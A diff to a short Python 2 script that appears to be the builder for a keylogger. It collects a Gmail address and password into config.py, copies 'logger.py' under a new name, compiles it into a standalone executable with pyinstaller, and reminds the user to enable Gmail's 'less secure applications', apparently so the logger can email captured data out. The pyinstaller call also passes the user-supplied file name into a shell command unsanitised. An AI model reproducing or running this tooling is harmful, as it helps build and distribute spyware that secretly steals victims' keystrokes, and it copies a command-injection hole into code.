@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
-
+from subprocess import call
+from shutil import copyfile
 
 email = raw_input("Email : ")
 password = raw_input("password : ")
@@ -14,3 +15,12 @@ with open("config.py",'w') as out:
     out.write("\nPASSWORD = \"" + password + "\"")
     out.write("\nSLEEP_INTERVAL = " + sleep_interval)
 
+print("[+] Writeing python logger to " + file_name)
+copyfile("logger.py", file_name)
+
+print("[+] Generating executable.")
+call("pyinstaller --onefile " + file_name, shell=True)
+print("\n[+] Executable is stored in dist/" + file_name)
+
+print("\n\n[***] Don't forget to allow less secure applications in your Gmail account.")
+print("Use the following link to do so https://myaccount.google.com/lesssecureapps")
